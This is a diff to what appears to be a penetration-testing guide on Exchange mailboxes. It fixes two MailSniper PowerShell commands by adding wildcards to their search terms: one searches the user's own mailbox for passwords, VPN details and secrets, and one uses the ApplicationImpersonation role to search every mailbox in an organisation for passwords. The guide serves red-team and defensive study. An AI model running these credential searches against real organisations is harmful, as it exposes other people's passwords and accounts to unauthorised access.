@@ -16,11 +16,11 @@ Mailboxes are a target in their own right: they hold passwords, password-reset l
 ## Searching mail
 
 ```powershell
-# MailSniper: search your own mailbox for secrets
-Invoke-SelfSearch -Mailbox user@example.local -Terms "password","vpn","secret"
+# MailSniper: search your own mailbox for secrets (terms use -like, so wrap in wildcards)
+Invoke-SelfSearch -Mailbox user@example.local -Terms "*password*","*vpn*","*secret*"
 
 # With the ApplicationImpersonation role, search every mailbox in the org
-Invoke-GlobalMailSearch -ImpersonationAccount user -ExchHostname <exch> -Terms "password"
+Invoke-GlobalMailSearch -ImpersonationAccount user -ExchHostname <exch> -Terms "*password*"
 ```
 
 ## Reading everyone: ApplicationImpersonation
